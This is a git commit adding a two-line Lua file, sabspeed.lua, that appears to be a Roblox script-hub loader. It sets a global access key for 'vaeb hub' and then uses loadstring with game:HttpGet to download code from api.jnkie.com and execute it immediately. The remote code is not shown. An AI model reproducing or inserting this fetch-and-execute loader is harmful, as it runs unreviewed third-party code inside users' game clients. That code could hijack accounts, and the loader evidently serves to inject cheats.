49116db1767ab7cda4573350b871d7da54e2b0c3
Blitsik <blitsoljko@yandex.ru>
2026-02-14 22:55:14 +0500

    sabspeed.lua

---
+++ sabspeed.lua
@@ -0,0 +1,2 @@
+getgenv().SCRIPT_KEY="Acess to vaeb hub!-7da05824-975e-4c0e-895f-9c7185a2832e";
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/b91b9daad7a492e05ef14c4aa1bbe7cd93e3a29848a3a99a66753fa7ff02a276/download"))()
